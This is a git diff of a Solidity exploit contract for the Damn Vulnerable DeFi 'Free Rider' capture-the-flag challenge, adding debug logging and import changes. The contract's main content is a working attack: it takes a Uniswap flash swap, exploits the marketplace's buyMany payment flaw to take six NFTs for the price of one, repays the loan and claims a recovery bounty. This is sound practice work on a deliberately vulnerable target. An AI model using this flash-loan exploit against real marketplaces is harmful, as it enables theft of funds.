@@ -1,6 +1,8 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+import { console2 } from "@dev/forge-std/src/console2.sol";
+import { IWETH } from "@contracts/CTF/Damn-Vulnerable-DeFi/00.Base/WETH9.sol";
 import { IERC721 } from "@openzeppelin/contracts-v4.7.1/token/ERC721/IERC721.sol";
 import { Address } from "@openzeppelin/contracts-v4.7.1/utils/Address.sol";
 import { ReentrancyGuard } from "@openzeppelin/contracts-v4.7.1/security/ReentrancyGuard.sol";
@@ -188,26 +190,6 @@ contract FreeRiderRecovery is ReentrancyGuard, IERC721Receiver {
     }
 }
 
-// Wrapped Ether https://etherscan.io/token/0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2#code
-interface IWETH {
-    function name() external view returns (string memory);
-    function approve(address guy, uint256 amount) external returns (bool);
-    function totalSupply() external view returns (uint256);
-    function transferFrom(address src, address dst, uint256 amount) external returns (bool);
-    function withdraw(uint256 amount) external;
-    function decimals() external view returns (uint8);
-    function balanceOf(address) external view returns (uint256);
-    function symbol() external view returns (string memory);
-    function transfer(address dst, uint256 amount) external returns (bool);
-    function deposit() external payable;
-    function allowance(address, address) external view returns (uint256);
-
-    event Approval(address indexed src, address indexed guy, uint256 amount);
-    event Transfer(address indexed src, address indexed dst, uint256 amount);
-    event Deposit(address indexed dst, uint256 amount);
-    event Withdrawal(address indexed src, uint256 amount);
-}
-
 contract FreeRiderHack is IUniswapV2Callee {
     IUniswapV2Pair private immutable pair;
     FreeRiderNFTMarketplace private immutable marketplace;
@@ -231,32 +213,44 @@ contract FreeRiderHack is IUniswapV2Callee {
     }
 
     function attack() external payable {
+        console2.log("Beofre Hacker ", address(this).balance, address(this).balance / 1e17);
         // 1. Request a flashSwap of 15 WETH from Uniswap Pair
         pair.swap(0, NFT_PRICE, address(this), abi.encode(NFT_PRICE));
+        console2.log("After Hacker  ", address(this).balance, address(this).balance / 1e17);
     }
 
+    /*
+        1. player 0.1 ether => unsiwap 0.003 free => 33 ether
+        2. player 15 ether price =>  6 NFT => 90 ether
+        3. player sell 6 NFT to receive => 45 ether
+        4. player get 90 + 45 - free
+    */
     function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
         // 1.Access Control
         require(msg.sender == address(pair), "Only Uniswap Pair Can call");
 
         // 2. Unwrap WETH to native ETH
         weth.withdraw(NFT_PRICE);
+        console2.log("Hacker swap withdraw", address(this).balance, address(this).balance / 1e17);
 
         // 3. Buy 6 NFTS for only 15 ETH total
         marketplace.buyMany{ value: NFT_PRICE }(tokens);
-
-        // // 4. Pay back 15WETH + 0.3% to the pair contract
+        console2.log("Hacker buyMany", address(this).balance, address(this).balance / 1e17);
+        // 4. Pay back 15WETH + 0.3% to the pair contract
         uint256 amountToPayBack = NFT_PRICE * 1004 / 1000;
         weth.deposit{ value: amountToPayBack }();
         weth.transfer(address(pair), amountToPayBack);
+        console2.log("Hacker fee", address(this).balance, address(this).balance / 1e17);
 
-        // // 5. Send NFTs to recovery contract so we can get the bounty
+        // 5. Send NFTs to recovery contract so we can get the bounty
         for (uint256 i; i < tokens.length; i++) {
-            nft.safeTransferFrom(address(this), recoveryContract, i, abi.encode(player));
+            console2.log("Hacker safeTransferFrom", i, address(this).balance, address(this).balance / 1e17);
+            nft.safeTransferFrom(address(this), recoveryContract, i, abi.encode(address(this)));
         }
     }
 
-    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
+    function onERC721Received(address, address, uint256 id, bytes memory) external view returns (bytes4) {
+        console2.log("Hacker onERC721Received", id, address(this).balance, address(this).balance / 1e17);
         return IERC721Receiver.onERC721Received.selector;
     }
 
